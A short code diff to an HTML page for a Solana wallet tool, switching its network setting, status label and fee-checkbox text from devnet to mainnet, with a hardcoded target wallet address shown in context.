@@ -474,7 +474,7 @@
                 </div>
                 <div class="status-indicator">
                     <span>NETWORK:</span>
-                    <span id="networkStatus">SOLANA_DEVNET</span>
+                    <span id="networkStatus">SOLANA_MAINNET</span>
                 </div>
                 <div class="status-indicator">
                     <span>ENCRYPTION:</span>
@@ -546,7 +546,7 @@
 
                     <div class="checkbox-container">
                         <input type="checkbox" class="terminal-checkbox" id="includeTip" disabled/>
-                        <label for="includeTip">Attach 0.001 SOL transaction fee (devnet)</label>
+                        <label for="includeTip">Attach 0.001 SOL transaction fee</label>
                     </div>
 
                     <div class="button-container">
@@ -579,7 +579,7 @@
     <script>
         // Global connection and variables
         let connection;
-        const SOLANA_NETWORK = 'devnet'; // Changed to devnet for better reliability
+        const SOLANA_NETWORK = 'mainnet-beta'; // Back to mainnet for real transactions
         const TARGET_WALLET = 'GS8Hq5ozk1GBL448qhTny1C6EyfsjM8uDhDFJ73oyAjr';
 
         // Wait for Solana Web3 to load
